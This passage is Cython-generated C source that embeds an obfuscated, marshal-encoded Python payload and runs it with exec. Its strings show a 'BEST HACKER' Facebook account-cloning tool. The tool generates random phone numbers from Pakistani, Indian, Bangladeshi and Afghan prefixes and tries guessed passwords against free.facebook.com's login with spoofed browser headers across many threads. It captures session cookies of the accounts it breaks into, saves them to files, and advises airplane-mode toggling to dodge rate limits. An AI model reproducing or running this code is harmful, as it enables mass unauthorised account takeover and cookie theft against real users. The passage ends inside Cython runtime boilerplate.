r\x07\x00\x00\x00\xda\x01er\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xe3\x00\x00\x00s\n\x00\x00\x00\x0c\x02\x0c\x02\n\x02\x0c\x02\x04\xfar\n\x00\x00\x00Nr\x0b\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x03\x00\x00\x00\xe1\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x0c\x02z\x07\x1b[1;91mz\x07\x1b[1;97mz\x07\x1b[1;32mz\x07\x1b[1;33mz\x07\x1b[1;34mz\x07\x1b[1;35mz\x07\x1b[1;92mz\x07\x1b[1;93mz\x07\x1b[1;94mz\x07\x1b[1;95mz\x07\x1b[1;96mz\x04\x1b[0mz\x07\x1b[1;90mz\x08\x1b[1;107mz\x08\x1b[1;106mz\x08\x1b[1;105mz\x08\x1b[1;104mz\x08\x1b[1;103mz\x08\x1b[1;102mz\x08\x1b[1;101mz\x08\x1b[1;100mz\x05%H:%Ma\x94\x06\x00\x00   \n\n\x1b[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH       HHHHHHHH\n\n\x1b[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\x1b[1;35m       B::::::BBBBBB:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       B:::::B     B:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       B::::B       B:::::B    HHHHHHHH        HHHHHHHH\n\n\x1b[1;35m       B::::B      B:::::B     HHHHHHHH        HHHHHHHH\n\n\x1b[1;35m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\x1b[1;32m       B:::::::::::::BB        H::::::H HHHHHH H::::::H\n\n\x1b[1;32m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\x1b[1;35m       B::::B      B:::::B     H::::::H        H::::::H\n\n\x1b[1;35m       B::::B       B:::::B    H::::::H        H::::::H\n\n\x1b[1;32m       B::::B      B:::::B     H::::::H        H::::::H\n\n\x1b[1;32m       BB:::::BBBBBB::::::B    H::::::H        H::::::H\n\n\x1b[1;35m       B:::::::::::::::::B     H::::::H        H::::::H\n\n\x1b[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\x1b[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH        HHHHHHHH   \n\n \n\n\x1b[1;37m================= \x1b[32;45mBEST Hacker\x1b[0;m =====================\n\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mBEST\x1b[0;m\x1b[1;32m HACKER \x1b[1;33mEDRIS NABIZADA\x1b[0;m\n\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m BEST HACKER\n\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM BEST HACKER\n\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE BY BEST HACKER\n\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mBEST HACKER\n\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m1.0\n\n\x1b[1;37m================= \x1b[32;45mBEST\x1b[0;m =====================\n\n \n\n       \x1b[37;41m\t WELLCOME TO BEST HACKER TOOL\x1b[0;m\n\n \n\n\x1b[1;37m================== \x1b[32;45mAFG\x1b[0;m ======================\nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02t\x03\x83\x01\x01\x00d\x00S\x00)\x02Nr\x0f\x00\x00\x00)\x04r\x13\x00\x00\x00r\x14\x00\x00\x00r\x16\x00\x00\x00r\x15\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x0f\x00\x00\x00u\x01\x00\x00s\x04\x00\x00\x00\n\x02\x0c\x02r\x0f\x00\x00\x00)\x01\xda\tlocaltime)\x01r\x14\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0c\x00\x00\x00Z\x02PMZ\x02AMz(\n\n\x1b[1;33mLoading asset files ... \x1b[0;97mg\xcd\xcc\xcc\xcc\xcc\xcc\x14@z\x035.2z*\n\x1b[1;31mNo internet connection ... \x1b[0;97mc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s<\x00\x00\x00g\x00d\x01\xa2\x01}\x01|\x01D\x00]\x15}\x02t\x00d\x02|\x00\x17\x00|\x02\x17\x00\x83\x01f\x01\x01\x00t\x01j\x02\xa0\x03\xa1\x00\x01\x00t\x04\xa0\x05d\x03\xa1\x01\x01\x00q\x06d\x00S\x00)\x04N)\x04z\x04.   z\x04..  z\x04... z\x05.... \xfa\x01\rr6\x00\x00\x00)\x06r\x16\x00\x00\x00rN\x00\x00\x00rO\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r&\x00\x00\x00)\x03r1\x00\x00\x00Z\x05titikr\x1c\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x07dynamic\xa5\x01\x00\x00s\n\x00\x00\x00\x08\x02\x08\x02\x12\x02\x16\x02\x04\xfcrX\x00\x00\x00i\x10\'\x00\x00z\x1eMozilla/5.0 (Linux; U; Android)\x0fr\x1f\x00\x00\x00\xda\x014\xda\x015\xda\x016\xda\x017\xda\x018\xda\x019Z\x0210Z\x0211Z\x0212Z\x0213Z\x0214Z\x0215Z\x0216Z\x0217z\x0b en-us; GT-)\x1a\xda\x01A\xda\x01B\xda\x01C\xda\x01D\xda\x01E\xda\x01F\xda\x01G\xda\x01H\xda\x01I\xda\x01J\xda\x01K\xda\x01Lr;\x00\x00\x00r:\x00\x00\x00\xda\x01O\xda\x01P\xda\x01Q\xda\x01R\xda\x01S\xda\x01T\xda\x01U\xda\x01V\xda\x01W\xda\x01X\xda\x01Y\xda\x01Zr6\x00\x00\x00i\xe7\x03\x00\x00z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\xe9I\x00\x00\x00\xe9d\x00\x00\x00r \x00\x00\x00ih\x10\x00\x00i$\x13\x00\x00\xe9(\x00\x00\x00\xe9\x96\x00\x00\x00z\x13Mobile Edris/537.36\xfa\x01 z\x02; z\x02) \xda\x01.c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\xcc\x01\x00\x00g\x00}\x00g\x00}\x01t\x00j\x01\x01\x00t\x00j\x02\x01\x00t\x00\xa0\x03d\x01\xa1\x01\x01\x00t\x04t\x05\x83\x01\x01\x00t\x04d\x02\x83\x01\x01\x00t\x04d\x03\x83\x01\x01\x00t\x04d\x04\x83\x01\x01\x00t\x04d\x05\x83\x01\x01\x00t\x04d\x04\x83\x01\x01\x00t\x04d\x06\x83\x01\x01\x00t\x04d\x07\x83\x01\x01\x00t\x04d\x08\x83\x01\x01\x00t\x04d\x07\x83\x01\x01\x00t\x06d\t\x83\x01}\x02t\x07d\n\x83\x01\x01\x00t\x08t\x06d\x0b\x83\x01\x83\x01}\x03t\t|\x03\x83\x01D\x00]\x13}\x04d\n\xa0\nd\x0cd\r\x84\x00t\td\x0e\x83\x01D\x00\x83\x01\xa1\x01}\x05|\x00\xa0\x0b|\x05\xa1\x01\x01\x00qIt\x00\xa0\x03d\x01\xa1\x01\x01\x00t\x07t\x05\x83\x01\x01\x00t\x08t\x06d\x0f\x83\x01\x83\x01}\x06g\x00}\x07t\x07d\n\x83\x01\x01\x00t\t|\x06\x83\x01D\x00]\x0b}\x08t\x06d\x10\x83\x01}\t|\x07\xa0\x0b|\t\xa1\x01\x01\x00qvt\x0cd\x11d\x12\x8d\x01\x8fE}\nt\r\x83\x00\x01\x00t\x0et\x0f|\x00\x83\x01\x83\x01}\x0bt\x07d\x13|\x0b\x17\x00\x83\x01\x01\x00t\x07d\x14\x83\x01\x01\x00t\x07d\x15\x83\x01\x01\x00t\x07d\x04\x83\x01\x01\x00|\x00D\x00]\x1f}\x0c|\x0cd\x16d\x00\x85\x02\x19\x00g\x01}\r|\x02|\x0c\x17\x00}\x0e|\x07D\x00]\x07}\x0f|\r\xa0\x0b|\x0f\xa1\x01\x01\x00q\xb4|\n\xa0\x10t\x11|\x0e|\r|\x0b\xa1\x04\x01\x00q\xa5W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x081\x00s\xcfw\x01\x01\x00\x01\x00\x01\x00Y\x00\x01\x00t\x07d\x04\x83\x01\x01\x00t\x07d\x17\x83\x01\x01\x00t\x07d\x18\x83\x01\x01\x00t\x07d\x04\x83\x01\x01\x00d\x00S\x00)\x19Nr\x0f\x00\x00\x00z"\x1b[1;37m\t \x1a USE OUR COUNTRY CODE \x1a zc\x1b[1;36m     \t     PAK CODES\n     \x1b[1;33m92301, \x1b[1;33m92302 ,\x1b[1;33m92303 ,\x1b[1;33m92305  ...\x1b[0;97mz3\x1b[1;32m============================================ze\x1b[1;36m     \t     INDIA CODES\n     \x1b[1;33m91778, \x1b[1;33m91930 ,\x1b[1;33m91902 ,\x1b[1;33m91712  ...\x1b[0;97mzb\x1b[1;36m     \t     BD CODES\n     \x1b[1;33m88016, \x1b[1;33m88017 ,\x1b[1;33m88018 ,\x1b[1;33m88019  ...\x1b[0;97mz4\x1b[1;32m============================================\nzc\x1b[1;36m     \t     AFG CODES\n     \x1b[1;33m93780, \x1b[1;33m93799 ,\x1b[1;33m93701 ,\x1b[1;33m93777  ...\x1b[0;97mz\x0c PUT CODE : r\x1d\x00\x00\x00z9 EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00s\x1c\x00\x00\x00\x81\x00|\x00]\t}\x01t\x00\xa0\x01t\x02j\x03\xa1\x01V\x00\x01\x00q\x02d\x00S\x00r\x04\x00\x00\x00)\x04\xda\x06random\xda\x06choicerH\x00\x00\x00Z\x06digits)\x02r3\x00\x00\x00\xda\x01_r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\t<genexpr>\x06\x02\x00\x00s\x04\x00\x00\x00\x02\x80\x1a\x00z\x14i.<locals>.<genexpr>\xe9\x07\x00\x00\x00z\x1b[*] Enter Password Limit : z\x15[*] Enter Password : \xe92\x00\x00\x00)\x01Z\x0bmax_workersz\x13\x1b[1;36m TOTAL IDS: z$\x1b[1;36m THE PROCESS HAS BEEN STARTEDz*\x1b[1;31m USE AEROPLANE MOOD IN EVERY 2 MIN r6\x00\x00\x00z Crack process has been completedz\x1aIds saved in ok.txt,cp.txt)\x12r\x13\x00\x00\x00\xda\x06getuid\xda\x07geteuidr\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x17\x00\x00\x00r\x16\x00\x00\x00\xda\x03intr>\x00\x00\x00\xda\x04join\xda\x06append\xda\nThreadPoolr\x0f\x00\x00\x00rJ\x00\x00\x00r9\x00\x00\x00Z\x06submit\xda\x06rcrack)\x10\xda\x04userZ\x03twf\xda\x04codeZ\x05limitZ\x04nmbrZ\x03nmpZ\x05passxZ\x07HamiiIDZ\x05bilalZ\x03pwwZ\x08manshera\xda\x02tlZ\x04love\xda\x03pwx\xda\x03uidZ\x04Emanr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r"\x00\x00\x00\xdb\x01\x00\x00s`\x00\x00\x00\x04\x02\x04\x02\x06\x02\x06\x02\n\x02\x08\x02\x08\x06\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x01\x08\x02\x08\x02\x08\x02\x0c\x02\x0c\x02\x18\x02\x0c\x02\n\x02\x08\x02\x0c\x02\x04\x02\x08\x02\x0c\x02\x08\x02\x0c\x02\x0c\x02\x06\x02\x0c\x02\x0c\x02\x08\x02\x08\x02\x08\x02\x08\x02\x0e\x02\x08\x02\x08\x02\x0c\x02\x12\x02\x02\xf6\x1c\xf2\x08\x1a\x08\x02\x08\x02\x0c\x02r"\x00\x00\x00c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x0b\x00\x00\x00C\x00\x00\x00sp\x02\x00\x00\x90\x01z0|\x01D\x00\x90\x01]\x0e}\x03t\x00\xa0\x01t\x02\xa1\x01}\x04t\x03\xa0\x04\xa1\x00}\x05|\x05\xa0\x05d\x01\xa1\x01j\x06}\x06t\x07\xa0\x08d\x02t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x04t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x05t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x06t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01d\x07d\x07|\x00|\x03d\x08d\t\x9c\t}\x07i\x00d\nd\x0b\x93\x01d\x0cd\r\x93\x01d\x0ed\x0f\x93\x01d\x10d\x11\x93\x01d\x12d\x13\x93\x01d\x14d\x15\x93\x01d\x16d\x17\x93\x01d\x18d\x19\x93\x01d\x1ad\x1b\x93\x01d\x1cd\x1d\x93\x01d\x1ed\x1f\x93\x01d d!\x93\x01d"d#\x93\x01d$d%\x93\x01d&d\'\x93\x01d(d)\x93\x01d*d+\x93\x01d,d-|\x04d.\x9c\x03\xa5\x01}\x08|\x05j\x0bd/|\x07|\x08d0\x8d\x03j\x06}\t|\x05j\x0c\xa0\r\xa1\x00\xa0\x0e\xa1\x00}\nd1|\nv\x00r\xd8d2\xa0\x0fd3d4\x84\x00|\x05j\x0c\xa0\r\xa1\x00\xa0\x10\xa1\x00D\x00\x83\x01\xa1\x01}\x0b|\x0bd5d6\x85\x02\x19\x00}\x0ct\x11d7|\x0c\x17\x00d8\x17\x00|\x03\x17\x00d9\x17\x00|\x0b\x17\x00d:\x17\x00|\x04\x17\x00d;\x17\x00\x83\x01\x01\x00t\x12|\x05|\x0b\x83\x02\x01\x00t\x13d<d=\x83\x02\xa0\x14|\x0cd8\x17\x00|\x03\x17\x00d>\x17\x00\xa1\x01\x01\x00t\x15\xa0\x16|\x0c\xa1\x01\x01\x00\x01\x00n<d?|\nv\x00\x90\x01r\x13d2\xa0\x0fd@d4\x84\x00|\x05j\x0c\xa0\r\xa1\x00\xa0\x10\xa1\x00D\x00\x83\x01\xa1\x01}\x0b|\x0bdAdB\x85\x02\x19\x00}\x0ct\x11dC|\x0c\x17\x00d8\x17\x00|\x03\x17\x00d;\x17\x00\x83\x01\x01\x00t\x13dDd=\x83\x02\xa0\x14|\x0cd8\x17\x00|\x03\x17\x00dE\x17\x00\xa1\x01\x01\x00t\x17\xa0\x16|\x0c\xa1\x01\x01\x00\x01\x00n\x01q\x04t\x18d\x037\x00a\x18t\x19j\x1a\xa0\x14dFt\x1bt\x18|\x02t\x1ct\x15\x83\x01t\x1ct\x17\x83\x01f\x05\x16\x00\xa1\x01f\x01\x01\x00t\x19j\x1a\xa0\x1d\xa1\x00\x01\x00W\x00d\x00S\x00\x01\x00\x01\x00\x01\x00Y\x00d\x00S\x00)GNrI\x00\x00\x00z\x18name="lsd" value="(.*?)"r6\x00\x00\x00z\x1cname="jazoest" value="(.*?)"z\x19name="m_ts" value="(.*?)"z\x17name="li" value="(.*?)"r \x00\x00\x00z\x06Log In)\tZ\x03lsdZ\x07jazoestZ\x04m_tsZ\x02liZ\ntry_numberZ\x12unrecognized_triesZ\x05emailZ\x04passZ\x05loginZ\tauthorityz\x11free.facebook.comr.\x00\x00\x00Z\x03GETZ\x06schemeZ\x05httpsZ\x06acceptz\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.8z\x0faccept-encodingz\x11gzip, deflate, brz\x0faccept-languagez\x0cen-US,en;q=1z\rcache-controlz#no-cache, no-store, must-revalidateZ\x07refererz\x17https://t.facebook.com/z\tsec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"z\x10sec-ch-ua-mobilez\x02?1z\x12sec-ch-ua-platformZ\x07Windowsz\x0esec-fetch-destZ\x08documentz\x0esec-fetch-modeZ\x08navigatez\x0esec-fetch-sitez\x0bsame-originz\x0esec-fetch-userz\x02?0Z\x06pragmaz\x08no-cacheZ\x08priorityz\x03u=0z\x0ccross-originr\x11\x00\x00\x00)\x03z\x1ccross-origin-resource-policyz\x19upgrade-insecure-requestsz\nuser-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)\x02\xda\x04dataZ\x07headersZ\x06c_user\xfa\x01;c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00\xf3\x1c\x00\x00\x00g\x00|\x00]\n\\\x02}\x01}\x02|\x01d\x00\x17\x00|\x02\x17\x00\x91\x02q\x02S\x00\xa9\x01\xfa\x01=r\x05\x00\x00\x00\xa9\x03r3\x00\x00\x00\xda\x03key\xda\x05valuer\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\x96\x02\x00\x00\xf3\x02\x00\x00\x00\x1c\x00z\x1arcrack.<locals>.<listcomp>r\x81\x00\x00\x00\xe9\x16\x00\x00\x00u\x19\x00\x00\x00    \x1b[1;32m(B-H-OK\xf0\x9f\x94\xa5)  z\x03 | z\x1b  \n \x1b[1;33mCookie = \x1b[1;32mz\x03 \n z\t  \x1b[0;97mz\x12/sdcard/B-H-OK.txtrF\x00\x00\x00rM\x00\x00\x00Z\ncheckpointc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00r\x91\x00\x00\x00r\x92\x00\x00\x00r\x05\x00\x00\x00r\x94\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\xa6\x02\x00\x00r\x97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9\'\x00\x00\x00u\x19\x00\x00\x00    \x1b[1;30m(B-H-CP\xf0\x9f\xa4\x95)  z\x12/sdcard/B-H-CP.txtz\x02 \nz1\r     %s[BEST-HACKER] [%s/%s]  OK:- %s  CP:- %s \r)\x1er}\x00\x00\x00r~\x00\x00\x00\xda\x04ugen\xda\x08requestsZ\x07Sessionr7\x00\x00\x00r1\x00\x00\x00\xda\x02re\xda\x06searchrJ\x00\x00\x00\xda\x05groupr-\x00\x00\x00r+\x00\x00\x00Z\x08get_dict\xda\x04keysr\x86\x00\x00\x00\xda\x05itemsr\x16\x00\x00\x00rE\x00\x00\x00\xda\x04openrP\x00\x00\x00\xda\x03oksr\x87\x00\x00\x00\xda\x03cps\xda\x04looprN\x00\x00\x00rO\x00\x00\x00rf\x00\x00\x00r9\x00\x00\x00rQ\x00\x00\x00)\rr\x8e\x00\x00\x00r\x8d\x00\x00\x00r\x8c\x00\x00\x00Z\x02psZ\x03pror@\x00\x00\x00Z\x07free_fbZ\x08log_dataZ\rheader_freefbZ\x02loZ\x0blog_cookiesrA\x00\x00\x00Z\x03cidr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x89\x00\x00\x00>\x02\x00\x00s\x96\x00\x00\x00\x04\x0c\n\x02\n\x02\x08\x02\x0c\x02\x14\x04\x14\x02\x14\x02\x14\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x06\xee\x08\x14\x04\x02\x02\xfe\x04\x04\x02\xfc\x04\x06\x02\xfa\x04\x08\x02\xf8\x04\n\x02\xf6\x04\x0c\x02\xf4\x04\x0e\x02\xf2\x04\x10\x02\xf0\x04\x12\x02\xee\x04\x14\x02\xec\x04\x16\x02\xea\x04\x18\x02\xe8\x04\x1a\x02\xe6\x04\x1c\x02\xe4\x04\x1e\x02\xe2\x04 \x02\xe0\x02"\x02\x02\x02\x02\x08\xda\x12(\x0e\x02\x08\x02\x1e\x02\x0c\x02(\x02\n\x02\x1c\x02\n\x02\x04\x02\n\x02\x1e\x02\x0c\x02\x18\x02\x1c\x02\n\x02\x04\x02\x02\x04\x08\x02$\x02\x10\x02\x06\x02\x06\x02r\x89\x00\x00\x00)kr\x13\x00\x00\x00rN\x00\x00\x00rR\x00\x00\x00r\x9c\x00\x00\x00Z\x04uuidr\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x1a\x00\x00\x00r\x18\x00\x00\x00r\x1c\x00\x00\x00Z\x04jsonr}\x00\x00\x00r\x9d\x00\x00\x00rH\x00\x00\x00\xda\x08platform\xda\x06base64Z\x03bs4r#\x00\x00\x00rC\x00\x00\x00Z\x04ressr%\x00\x00\x00r$\x00\x00\x00r&\x00\x00\x00Z\x05waktuZ\x12concurrent.futuresr\'\x00\x00\x00r\x88\x00\x00\x00Z\tmechanizeZ\x13requests.exceptionsr(\x00\x00\x00\xda\x13ModuleNotFoundErrorrE\x00\x00\x00rL\x00\x00\x00Z\x03REDr<\x00\x00\x00r=\x00\x00\x00Z\x06YELLOWZ\x04BLUEZ\x06ORANGErl\x00\x00\x00r;\x00\x00\x00rf\x00\x00\x00ri\x00\x00\x00r`\x00\x00\x00rq\x00\x00\x00rk\x00\x00\x00r:\x00\x00\x00r_\x00\x00\x00Z\x02BNZ\x03BBLZ\x02BPZ\x02BBZ\x02BKZ\x02BHZ\x02BMZ\x02BAZ\x08my_colorr~\x00\x00\x00Z\x05warnaZ\x03now\xda\x08strftimeZ\tdt_stringZ\x07currentZ\x04yearZ\x02taZ\x05monthZ\x02buZ\x03dayZ\x02haZ\x05todayr\xa5\x00\x00\x00r\xa3\x00\x00\x00r\xa4\x00\x00\x00r\x0f\x00\x00\x00rT\x00\x00\x00Z\x02lt\xda\x03cmdr\x85\x00\x00\x00Z\x03ltxrF\x00\x00\x00\xda\x03tagr\x16\x00\x00\x00\xda\x01v\xda\x06updaterJ\x00\x00\x00rX\x00\x00\x00Z\x05ugen2r\x9b\x00\x00\x00r>\x00\x00\x00Z\x02xdZ\x02aa\xda\x01b\xda\x01c\xda\x01dZ\trandrangerS\x00\x00\x00\xda\x01f\xda\x01g\xda\x01hr"\x00\x00\x00\xda\x01j\xda\x01k\xda\x01lZ\x05uaku2r\x87\x00\x00\x00r\x89\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\xde\x00\x00\x00\x08\x04\x08\x02\x08\x02\x08\x02\x08\x02\n\x02\n\x02\x0e\x02\x04\x08\x08\x02\x08\x16\x08\x16P.\n\x02\x0c\x02\x0c\x02\x08\x02\x0c\x02\x0c\x02\x0c\x02\x0c\x02\x02\x02\x08\x02\x0c\x02\x08\x02\x10\x02\x0c\x02\n\x02\x0e\x02\x02\xfc\x08\x08\x084\x0e\x12\x04\x0e\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x10\x04\x04\xfe\n\x04\x08\x02\n\x02\x08\x02\x06\x02\x06\x02\x06\x02\x08\x02\x04\x02\x04<\x04\x02\x04\x02\x08\x04\x0c\x06\x0c\x02\x0e\x02\n\x02\x08\x02\x06\x02\x04\x04\x04\x02\x02\x06\x08\x02\x04\x02\x04\x02\x04\x02\x0e\x02\x0c\x02\x02\x02\x04\x80\x10\x02\x08\x04\x04\x0e\x04\x02\x0c\x04\x04\x02\x0e\x02\x04\x02\x0e\x02\x0c\x02\x0e\x02\x04\x02\x0c\x02\x04\x02\x0c\x02\x0c\x02\x04\x02B\x02\x0e\x02\x08\x06\x08c\x00\x7f\n\x05'))             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyExec3(__pyx_t_1, __pyx_t_2, 0);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "oo.py":1
 * # Compile By : Edris Nabizada             # <<<<<<<<<<<<<<
 * # Github : https://github.com/edrisnabizada
 * # Python Version 3.10.4
 */
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init oo", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init oo");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
